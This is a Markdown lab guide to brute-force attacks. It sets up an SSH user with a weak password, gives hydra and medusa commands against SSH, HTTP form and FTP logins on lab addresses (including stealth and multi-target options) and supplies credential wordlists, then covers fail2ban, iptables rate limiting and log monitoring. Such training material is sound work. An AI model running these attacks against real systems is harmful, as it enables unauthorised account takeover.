# Brute Force Attack Laboratory

## SSH Brute Force Challenge

### Target Setup
```bash
# Create vulnerable SSH user
sudo useradd -m -s /bin/bash testuser
echo 'testuser:weakpass' | sudo chpasswd

# Allow SSH login
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh
```

### Attack Commands
```bash
# Basic SSH brute force
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.30

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.30

# Threaded attack
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.30

# With delays (stealth)
hydra -l admin -P passwords.txt -W 5 ssh://192.168.1.30
```

## HTTP Form Brute Force

### Login Form Attack
```bash
# Basic HTTP form brute force
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"

# With cookies
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Cookie\: PHPSESSID=123:Invalid"

# HTTPS form
hydra -l admin -P passwords.txt 192.168.1.10 https-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
```

## FTP Brute Force

### FTP Service Attack
```bash
# Basic FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.10

# Anonymous FTP check
hydra -l anonymous -p "" ftp://192.168.1.10

# Multiple protocols
hydra -l admin -P passwords.txt 192.168.1.10 ftp
```

## Custom Wordlists

### passwords.txt
```
admin
password
123456
admin123
password123
letmein
welcome
qwerty
abc123
Password1
root
toor
kali
administrator
manager
guest
test
demo
user
login
```

### users.txt
```
admin
administrator
root
user
guest
test
demo
manager
operator
service
```

## Defense Mechanisms

### Fail2Ban Configuration
```bash
# Install fail2ban
sudo apt install fail2ban

# Configure SSH protection
sudo cat > /etc/fail2ban/jail.local << EOF
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600
EOF

# Restart fail2ban
sudo systemctl restart fail2ban
```

### Rate Limiting with iptables
```bash
# Limit SSH connections
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP

# Limit HTTP requests
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

## Monitoring and Detection

### Log Analysis
```bash
# Monitor failed SSH attempts
sudo tail -f /var/log/auth.log | grep "Failed password"

# Count failed attempts
sudo grep "Failed password" /var/log/auth.log | wc -l

# Show attacking IPs
sudo grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
```

### Real-time Monitoring
```bash
# Monitor connections
netstat -tulpn | grep :22

# Check active sessions
who

# Monitor system load
htop
```

## Advanced Techniques

### Custom Hydra Modules
```bash
# Create custom service module
hydra -l admin -P passwords.txt -s 8080 192.168.1.10 http-get /admin

# Multiple targets
hydra -l admin -P passwords.txt -M targets.txt ssh

# Resume session
hydra -l admin -P passwords.txt -R ssh://192.168.1.30
```

### Medusa Alternative
```bash
# SSH brute force with Medusa
medusa -h 192.168.1.30 -u admin -P passwords.txt -M ssh

# HTTP brute force
medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/admin

# FTP brute force
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp
```

## Ethical Guidelines

### Legal Considerations
- Only test on systems you own or have explicit permission
- Use isolated lab environments
- Document all testing activities
- Follow responsible disclosure practices

### Best Practices
- Always test defenses after attacks
- Implement proper logging and monitoring
- Use realistic but not harmful attack scenarios
- Focus on education and improvement

### Defense Learning Objectives
1. Understand attack vectors
2. Implement proper monitoring
3. Configure effective defenses
4. Test security measures
5. Develop incident response procedures
